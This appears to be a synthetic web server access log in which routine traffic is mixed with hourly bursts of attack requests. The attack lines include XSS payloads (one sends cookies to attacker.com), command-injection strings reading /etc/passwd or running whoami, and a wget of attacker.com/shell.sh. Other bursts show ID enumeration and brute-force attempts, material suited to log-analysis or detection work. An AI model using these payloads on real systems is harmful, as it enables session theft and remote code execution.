91.152.3.77 - - [01/Jun/2025:19:07:18 +0000] "GET /products HTTP/1.1" 200 1223 "-" "Wget/1.21"
193.136.5.20 - - [01/Jun/2025:19:10:22 +0000] "GET /robots.txt HTTP/1.1" 304 9681 "-" "curl/7.68.0"
195.23.11.8 - - [01/Jun/2025:19:11:48 +0000] "GET /robots.txt HTTP/1.1" 304 298 "-" "Mozilla/5.0 (X11; Linux x86_64)"
193.136.5.20 - - [01/Jun/2025:19:12:01 +0000] "GET /products HTTP/1.1" 200 7581 "-" "python-requests/2.28.0"
193.136.5.20 - - [01/Jun/2025:19:12:09 +0000] "GET /favicon.ico HTTP/1.1" 200 214 "-" "Mozilla/5.0 (X11; Linux x86_64)"
193.136.5.20 - - [01/Jun/2025:19:16:46 +0000] "GET /robots.txt HTTP/1.1" 200 11312 "-" "Wget/1.21"
91.152.3.77 - - [01/Jun/2025:19:21:29 +0000] "GET /static/js/app.js HTTP/1.1" 304 11571 "-" "Wget/1.21"
85.241.12.44 - - [01/Jun/2025:19:23:23 +0000] "GET /robots.txt HTTP/1.1" 200 12915 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.152.3.77 - - [01/Jun/2025:19:31:34 +0000] "POST /static/js/app.js HTTP/1.1" 404 8562 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:19:47:57 +0000] "GET /robots.txt HTTP/1.1" 304 3414 "-" "Mozilla/5.0 (X11; Linux x86_64)"
85.241.12.44 - - [01/Jun/2025:19:48:57 +0000] "GET /blog HTTP/1.1" 304 10089 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:19:52:32 +0000] "GET /favicon.ico HTTP/1.1" 304 7853 "-" "Wget/1.21"
91.152.3.77 - - [01/Jun/2025:19:54:38 +0000] "GET /about HTTP/1.1" 200 12972 "-" "python-requests/2.28.0"
2.80.17.99 - - [01/Jun/2025:19:58:32 +0000] "GET /blog/post-1 HTTP/1.1" 200 8710 "-" "Wget/1.21"
195.23.11.8 - - [01/Jun/2025:19:58:55 +0000] "GET /robots.txt HTTP/1.1" 200 13241 "-" "python-requests/2.28.0"
198.235.24.130 - - [01/Jun/2025:20:00:00 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 500 1184 "-" "curl/7.68.0"
185.156.73.54 - - [01/Jun/2025:20:00:00 +0000] "GET /backup?file=report.pdf;cat+/etc/passwd HTTP/1.1" 200 1195 "-" "curl/7.68.0"
185.156.73.54 - - [01/Jun/2025:20:00:21 +0000] "GET /ping?host=192.168.1.1;whoami HTTP/1.1" 500 1829 "-" "curl/7.68.0"
198.235.24.130 - - [01/Jun/2025:20:00:24 +0000] "GET /page?id=javascript:alert(1) HTTP/1.1" 200 931 "-" "curl/7.68.0"
198.235.24.130 - - [01/Jun/2025:20:00:42 +0000] "GET /profile?name=<script>document.location='http://attacker.com?c='+document.cookie</script> HTTP/1.1" 500 1199 "-" "curl/7.68.0"
185.156.73.54 - - [01/Jun/2025:20:00:54 +0000] "GET /exec?cmd=$(wget+http://attacker.com/shell.sh) HTTP/1.1" 500 1620 "-" "curl/7.68.0"
193.136.5.20 - - [01/Jun/2025:20:01:44 +0000] "GET /about HTTP/1.1" 200 493 "-" "curl/7.68.0"
85.241.12.44 - - [01/Jun/2025:20:02:56 +0000] "POST /about HTTP/1.1" 200 14190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:20:10:10 +0000] "GET /static/js/app.js HTTP/1.1" 404 204 "-" "Wget/1.21"
188.37.240.1 - - [01/Jun/2025:20:15:18 +0000] "POST /sitemap.xml HTTP/1.1" 200 4511 "-" "Mozilla/5.0 (X11; Linux x86_64)"
188.37.240.1 - - [01/Jun/2025:20:23:55 +0000] "GET /contact HTTP/1.1" 200 3775 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:20:35:34 +0000] "GET /blog/post-1 HTTP/1.1" 304 2941 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
2.80.17.99 - - [01/Jun/2025:20:42:51 +0000] "GET /favicon.ico HTTP/1.1" 404 6594 "-" "Wget/1.21"
188.37.240.1 - - [01/Jun/2025:20:45:14 +0000] "POST /products HTTP/1.1" 200 8870 "-" "Wget/1.21"
193.136.5.20 - - [01/Jun/2025:20:51:01 +0000] "POST /favicon.ico HTTP/1.1" 200 8410 "-" "Wget/1.21"
188.37.240.1 - - [01/Jun/2025:20:51:30 +0000] "GET / HTTP/1.1" 200 14524 "-" "python-requests/2.28.0"
85.241.12.44 - - [01/Jun/2025:20:55:19 +0000] "POST /blog HTTP/1.1" 200 8508 "-" "Wget/1.21"
91.152.3.77 - - [01/Jun/2025:20:55:59 +0000] "GET / HTTP/1.1" 200 12846 "-" "Mozilla/5.0 (X11; Linux x86_64)"
89.207.132.170 - - [01/Jun/2025:21:00:00 +0000] "GET /profile?name=<script>document.location='http://attacker.com?c='+document.cookie</script> HTTP/1.1" 200 410 "-" "curl/7.68.0"
91.240.118.222 - - [01/Jun/2025:21:00:00 +0000] "GET /ping?host=192.168.1.1;whoami HTTP/1.1" 200 1537 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:00 +0000] "PATCH /dashboard HTTP/1.1" 405 528 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.32.162.44 - - [01/Jun/2025:21:00:13 +0000] "TRACE /index.html HTTP/1.1" 200 756 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.240.118.222 - - [01/Jun/2025:21:00:16 +0000] "GET /search?q=test|id HTTP/1.1" 500 533 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:16 +0000] "TRACE /admin HTTP/1.1" 200 801 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
89.207.132.170 - - [01/Jun/2025:21:00:18 +0000] "GET /page?id=javascript:alert(1) HTTP/1.1" 500 1863 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:24 +0000] "CONNECT /login HTTP/1.1" 200 913 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.240.118.222 - - [01/Jun/2025:21:00:32 +0000] "GET /ping?host=127.0.0.1&&uname+-a HTTP/1.1" 200 1001 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:33 +0000] "PUT /users/1 HTTP/1.1" 403 928 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
89.207.132.170 - - [01/Jun/2025:21:00:34 +0000] "GET /comment?text=<img+src=x+onerror=alert(document.cookie)> HTTP/1.1" 200 151 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:01:00 +0000] "DELETE /users/1 HTTP/1.1" 403 983 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.240.118.222 - - [01/Jun/2025:21:01:03 +0000] "GET /backup?file=report.pdf;cat+/etc/passwd HTTP/1.1" 500 644 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:01:10 +0000] "PUT /static/app.js HTTP/1.1" 405 856 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.240.118.222 - - [01/Jun/2025:21:01:16 +0000] "GET /exec?cmd=$(wget+http://attacker.com/shell.sh) HTTP/1.1" 200 850 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:01:18 +0000] "TRACK / HTTP/1.1" 405 572 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
2.80.17.99 - - [01/Jun/2025:21:02:21 +0000] "GET /static/js/app.js HTTP/1.1" 200 5432 "-" "python-requests/2.28.0"
195.23.11.8 - - [01/Jun/2025:21:07:48 +0000] "GET /static/css/main.css HTTP/1.1" 200 12924 "-" "python-requests/2.28.0"
193.136.5.20 - - [01/Jun/2025:21:12:37 +0000] "GET /blog/post-1 HTTP/1.1" 200 10309 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:21:13:32 +0000] "POST / HTTP/1.1" 200 13002 "-" "Mozilla/5.0 (X11; Linux x86_64)"
193.136.5.20 - - [01/Jun/2025:21:14:49 +0000] "GET /static/js/app.js HTTP/1.1" 304 14931 "-" "Wget/1.21"
195.23.11.8 - - [01/Jun/2025:21:20:33 +0000] "GET /contact HTTP/1.1" 304 12060 "-" "Wget/1.21"
2.80.17.99 - - [01/Jun/2025:21:29:12 +0000] "GET /blog/post-1 HTTP/1.1" 200 7105 "-" "curl/7.68.0"
85.241.12.44 - - [01/Jun/2025:21:30:40 +0000] "GET /about HTTP/1.1" 200 2463 "-" "Mozilla/5.0 (X11; Linux x86_64)"
85.241.12.44 - - [01/Jun/2025:21:34:51 +0000] "POST /products/1 HTTP/1.1" 304 4420 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:21:40:29 +0000] "GET /sitemap.xml HTTP/1.1" 200 8925 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:21:42:46 +0000] "GET /static/js/app.js HTTP/1.1" 200 11972 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:21:43:02 +0000] "GET /blog/post-1 HTTP/1.1" 200 8525 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.152.3.77 - - [01/Jun/2025:21:44:10 +0000] "POST /about HTTP/1.1" 200 11423 "-" "python-requests/2.28.0"
2.80.17.99 - - [01/Jun/2025:21:54:28 +0000] "GET /favicon.ico HTTP/1.1" 304 4564 "-" "curl/7.68.0"
195.23.11.8 - - [01/Jun/2025:21:55:58 +0000] "GET /products HTTP/1.1" 200 12561 "-" "Mozilla/5.0 (X11; Linux x86_64)"
194.147.78.155 - - [01/Jun/2025:22:00:00 +0000] "GET /ping?host=192.168.1.1;whoami HTTP/1.1" 500 1543 "-" "curl/7.68.0"
45.129.56.200 - - [01/Jun/2025:22:00:00 +0000] "PUT /static/app.js HTTP/1.1" 403 943 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
77.81.142.9 - - [01/Jun/2025:22:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 132 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:01 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 150 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:04 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 153 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:12 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 132 "-" "Mozilla/5.0 (X11; Linux x86_64)"
45.129.56.200 - - [01/Jun/2025:22:00:14 +0000] "TRACK / HTTP/1.1" 403 112 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
77.81.142.9 - - [01/Jun/2025:22:00:15 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 101 "-" "Mozilla/5.0 (X11; Linux x86_64)"
45.129.56.200 - - [01/Jun/2025:22:00:16 +0000] "PUT /users/1 HTTP/1.1" 405 861 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
77.81.142.9 - - [01/Jun/2025:22:00:20 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 112 "-" "Mozilla/5.0 (X11; Linux x86_64)"
194.147.78.155 - - [01/Jun/2025:22:00:24 +0000] "GET /ping?host=127.0.0.1&&uname+-a HTTP/1.1" 200 1021 "-" "curl/7.68.0"
194.147.78.155 - - [01/Jun/2025:22:00:28 +0000] "GET /exec?cmd=$(wget+http://attacker.com/shell.sh) HTTP/1.1" 200 860 "-" "curl/7.68.0"
45.129.56.200 - - [01/Jun/2025:22:00:45 +0000] "CONNECT /login HTTP/1.1" 200 375 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:00:48 +0000] "DELETE /config HTTP/1.1" 405 928 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:00:54 +0000] "DELETE /admin HTTP/1.1" 405 648 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:01:08 +0000] "DELETE /users/1 HTTP/1.1" 405 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
194.147.78.155 - - [01/Jun/2025:22:01:27 +0000] "GET /search?q=test|id HTTP/1.1" 500 746 "-" "curl/7.68.0"
45.129.56.200 - - [01/Jun/2025:22:01:45 +0000] "TRACE /index.html HTTP/1.1" 403 847 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
194.147.78.155 - - [01/Jun/2025:22:02:00 +0000] "GET /backup?file=report.pdf;cat+/etc/passwd HTTP/1.1" 200 1244 "-" "curl/7.68.0"
188.37.240.1 - - [01/Jun/2025:22:09:35 +0000] "GET /about HTTP/1.1" 200 6076 "-" "Mozilla/5.0 (X11; Linux x86_64)"
195.23.11.8 - - [01/Jun/2025:22:23:52 +0000] "POST / HTTP/1.1" 200 12947 "-" "Wget/1.21"
91.152.3.77 - - [01/Jun/2025:22:35:33 +0000] "GET /products HTTP/1.1" 200 11615 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:22:42:58 +0000] "GET /favicon.ico HTTP/1.1" 200 5821 "-" "python-requests/2.28.0"
195.23.11.8 - - [01/Jun/2025:22:45:57 +0000] "POST /static/css/main.css HTTP/1.1" 200 10517 "-" "Mozilla/5.0 (X11; Linux x86_64)"
188.37.240.1 - - [01/Jun/2025:22:46:07 +0000] "GET /static/css/main.css HTTP/1.1" 200 2610 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
85.241.12.44 - - [01/Jun/2025:22:54:14 +0000] "GET /contact HTTP/1.1" 200 7269 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.108.56.181 - - [01/Jun/2025:23:00:00 +0000] "PUT /users/1 HTTP/1.1" 200 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 111 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:02 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 105 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:02 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:03 +0000] "GET /api/tasks/1 HTTP/1.1" 404 58 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:04 +0000] "GET /api/tasks/4 HTTP/1.1" 404 6 "-" "curl/7.68.0"
85.241.12.44 - - [01/Jun/2025:23:00:05 +0000] "POST /products/1 HTTP/1.1" 200 11817 "-" "Wget/1.21"
91.108.56.181 - - [01/Jun/2025:23:00:06 +0000] "PUT /static/app.js HTTP/1.1" 200 610 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
176.10.99.200 - - [01/Jun/2025:23:00:06 +0000] "GET /api/tasks/2 HTTP/1.1" 404 118 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:06 +0000] "GET /api/tasks/6 HTTP/1.1" 404 66 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:07 +0000] "GET /api/tasks/7 HTTP/1.1" 404 22 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:09 +0000] "GET /api/tasks/3 HTTP/1.1" 404 75 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:09 +0000] "GET /api/tasks/9 HTTP/1.1" 404 24 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:13 +0000] "GET /api/tasks/13 HTTP/1.1" 404 100 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:14 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 190 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:15 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 137 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:15 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 158 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:15 +0000] "GET /api/tasks/5 HTTP/1.1" 404 48 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:16 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 189 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:16 +0000] "GET /api/tasks/8 HTTP/1.1" 404 11 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:16 +0000] "GET /api/tasks/16 HTTP/1.1" 404 51 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:18 +0000] "DELETE /admin HTTP/1.1" 403 208 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
176.10.99.200 - - [01/Jun/2025:23:00:18 +0000] "GET /api/tasks/18 HTTP/1.1" 404 58 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:20 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 199 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:20 +0000] "GET /api/tasks/10 HTTP/1.1" 404 150 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:22 +0000] "GET /api/tasks/11 HTTP/1.1" 404 132 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:24 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 110 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:24 +0000] "GET /api/tasks/12 HTTP/1.1" 404 64 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:36 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 97 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.108.56.181 - - [01/Jun/2025:23:00:42 +0000] "DELETE /config HTTP/1.1" 200 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
176.10.99.200 - - [01/Jun/2025:23:00:42 +0000] "GET /api/tasks/14 HTTP/1.1" 404 56 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:42 +0000] "GET /api/tasks/21 HTTP/1.1" 404 55 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:44 +0000] "GET /api/tasks/22 HTTP/1.1" 404 102 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:45 +0000] "GET /api/tasks/15 HTTP/1.1" 404 30 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:51 +0000] "GET /api/tasks/17 HTTP/1.1" 404 77 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:57 +0000] "GET /api/tasks/19 HTTP/1.1" 404 137 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:01:00 +0000] "GET /api/tasks/20 HTTP/1.1" 404 127 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:01:09 +0000] "GET /api/tasks/23 HTTP/1.1" 404 140 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:01:12 +0000] "GET /api/tasks/24 HTTP/1.1" 404 134 "-" "curl/7.68.0"
85.241.12.44 - - [01/Jun/2025:23:36:37 +0000] "GET /index.html HTTP/1.1" 200 7897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:23:37:33 +0000] "GET /favicon.ico HTTP/1.1" 200 6991 "-" "Wget/1.21"
193.136.5.20 - - [01/Jun/2025:23:39:06 +0000] "GET /products HTTP/1.1" 200 11216 "-" "Mozilla/5.0 (X11; Linux x86_64)"
85.241.12.44 - - [01/Jun/2025:23:42:18 +0000] "POST /robots.txt HTTP/1.1" 200 722 "-" "curl/7.68.0"
195.23.11.8 - - [01/Jun/2025:23:46:32 +0000] "POST /index.html HTTP/1.1" 304 11411 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 155 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:00 +0000] "POST /api/auth/register HTTP/1.1" 400 182 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:01 +0000] "GET /api/tasks/1 HTTP/1.1" 404 15 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:02 +0000] "GET /api/tasks/2 HTTP/1.1" 404 82 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:02 +0000] "POST /api/auth/register HTTP/1.1" 400 80 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:04 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 118 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:04 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 141 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:06 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 159 "-" "Mozilla/5.0 (X11; Linux x86_64)"
62.171.137.5 - - [02/Jun/2025:00:00:06 +0000] "GET /api/tasks/3 HTTP/1.1" 404 128 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:08 +0000] "POST /api/auth/register HTTP/1.1" 409 119 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:08 +0000] "POST /api/auth/register HTTP/1.1" 409 103 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:09 +0000] "GET /api/tasks/9 HTTP/1.1" 404 122 "-" "curl/7.68.0"
5.188.10.180 - - [02/Jun/2025:00:00:10 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 189 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:10 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 111 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:10 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 181 "-" "Mozilla/5.0 (X11; Linux x86_64)"
62.171.137.5 - - [02/Jun/2025:00:00:10 +0000] "GET /api/tasks/5 HTTP/1.1" 404 39 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:10 +0000] "POST /api/auth/register HTTP/1.1" 400 165 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:10 +0000] "POST /api/auth/register HTTP/1.1" 409 162 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:11 +0000] "GET /api/tasks/11 HTTP/1.1" 404 118 "-" "curl/7.68.0"
5.188.10.180 - - [02/Jun/2025:00:00:12 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 101 "-" "Mozilla/5.0 (X11; Linux x86_64)"
62.171.137.5 - - [02/Jun/2025:00:00:12 +0000] "GET /api/tasks/4 HTTP/1.1" 404 140 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:12 +0000] "GET /api/tasks/6 HTTP/1.1" 404 58 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:12 +0000] "GET /api/tasks/12 HTTP/1.1" 404 48 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:12 +0000] "POST /api/auth/register HTTP/1.1" 409 113 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:12 +0000] "POST /api/auth/register HTTP/1.1" 409 135 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:14 +0000] "GET /api/tasks/7 HTTP/1.1" 404 102 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:14 +0000] "POST /api/auth/register HTTP/1.1" 409 192 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:16 +0000] "GET /api/tasks/8 HTTP/1.1" 404 71 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:22 +0000] "POST /api/auth/register HTTP/1.1" 409 197 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:24 +0000] "POST /api/auth/register HTTP/1.1" 400 110 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:24 +0000] "POST /api/auth/register HTTP/1.1" 400 141 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:26 +0000] "POST /api/auth/register HTTP/1.1" 400 99 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:30 +0000] "GET /api/tasks/10 HTTP/1.1" 404 99 "-" "curl/7.68.0"
5.188.10.180 - - [02/Jun/2025:00:00:35 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 119 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:36 +0000] "POST /api/auth/register HTTP/1.1" 409 128 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:39 +0000] "GET /api/tasks/13 HTTP/1.1" 404 148 "-" "curl/7.68.0"
5.188.10.180 - - [02/Jun/2025:00:00:40 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 124 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:45 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 159 "-" "Mozilla/5.0 (X11; Linux x86_64)"
194.61.24.9 - - [02/Jun/2025:01:00:00 +0000] "POST /api/auth/register HTTP/1.1" 400 81 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:02 +0000] "GET /api/projects/1 HTTP/1.1" 404 51 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:02 +0000] "GET /api/projects/2 HTTP/1.1" 404 141 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:02 +0000] "POST /api/auth/register HTTP/1.1" 400 101 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:03 +0000] "POST /api/auth/register HTTP/1.1" 400 146 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:06 +0000] "GET /api/projects/6 HTTP/1.1" 404 64 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:08 +0000] "POST /api/auth/register HTTP/1.1" 409 175 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:09 +0000] "GET /api/projects/3 HTTP/1.1" 404 69 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:10 +0000] "POST /api/auth/register HTTP/1.1" 400 185 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:12 +0000] "GET /api/projects/4 HTTP/1.1" 404 8 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:12 +0000] "POST /api/auth/register HTTP/1.1" 400 114 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:13 +0000] "GET /api/projects/13 HTTP/1.1" 404 3 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:14 +0000] "GET /api/projects/14 HTTP/1.1" 404 139 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:15 +0000] "GET /api/projects/5 HTTP/1.1" 404 128 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:15 +0000] "GET /api/projects/15 HTTP/1.1" 404 102 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:16 +0000] "GET /api/projects/8 HTTP/1.1" 404 38 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:16 +0000] "GET /api/projects/16 HTTP/1.1" 404 118 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:16 +0000] "POST /api/auth/register HTTP/1.1" 400 170 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:18 +0000] "POST /api/auth/register HTTP/1.1" 400 140 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:20 +0000] "POST /api/auth/register HTTP/1.1" 400 142 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:21 +0000] "GET /api/projects/7 HTTP/1.1" 404 144 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:21 +0000] "POST /api/auth/register HTTP/1.1" 400 100 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:22 +0000] "GET /api/projects/11 HTTP/1.1" 404 17 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:22 +0000] "POST /api/auth/register HTTP/1.1" 409 111 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:24 +0000] "POST /api/auth/register HTTP/1.1" 400 159 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:27 +0000] "GET /api/projects/9 HTTP/1.1" 404 134 "-" "curl/7.68.0"
